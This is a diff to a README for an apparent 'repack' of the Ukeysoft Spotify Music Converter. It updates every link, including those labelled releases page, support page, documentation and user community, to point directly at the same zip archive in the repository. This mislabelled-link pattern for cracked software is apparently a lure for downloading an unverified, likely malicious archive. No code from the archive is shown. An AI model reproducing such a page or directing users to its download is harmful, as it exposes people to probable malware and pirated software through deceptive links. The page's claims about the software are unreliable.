@@ -1,6 +1,6 @@
 # 🎶 Ukeysoft-Spotify-Music-Converter-Repack - Effortlessly Convert Your Spotify Songs
 
-[![Download Ukeysoft-Spotify-Music-Converter-Repack](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)
+[![Download Ukeysoft-Spotify-Music-Converter-Repack](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Ukeysoft Spotify Music Converter Repack! This software allows you
 
 1. **Visit the Releases Page**: Click on the link below to go to our releases page where you can find the latest version of the software.
    
-   [Visit this page to download](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)
+   [Visit this page to download](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)
 
 2. **Find the Latest Release**: Once on the releases page, you will see various versions of the Ukeysoft Spotify Music Converter. Look for the version labeled as the "latest."
 
@@ -62,14 +62,14 @@ A: No, your original tracks will remain in your Spotify library. This software m
 
 ## ✅ Support
 
-If you encounter any issues while using the Ukeysoft Spotify Music Converter, please visit our support page [here](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip) or reach out for help.
+If you encounter any issues while using the Ukeysoft Spotify Music Converter, please visit our support page [here](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip) or reach out for help.
 
 ## 🔗 Additional Resources
 
 For more information or updates, follow these links:
-- [Official Documentation](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)
-- [User Community](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)
+- [Official Documentation](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)
+- [User Community](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)
 
 Explore the world of music with Ukeysoft Spotify Music Converter and enjoy your Spotify tracks like never before!
 
-[![Download Ukeysoft-Spotify-Music-Converter-Repack](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)](https://raw.githubusercontent.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/main/digitalin/Music_Ukeysoft_Spotify_Repack_Converter_3.7.zip)
+[![Download Ukeysoft-Spotify-Music-Converter-Repack](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)](https://github.com/SKibidinuggetclaw/Ukeysoft-Spotify-Music-Converter-Repack/raw/refs/heads/main/digitalin/Music_Repack_Ukeysoft_Converter_Spotify_v3.3.zip)
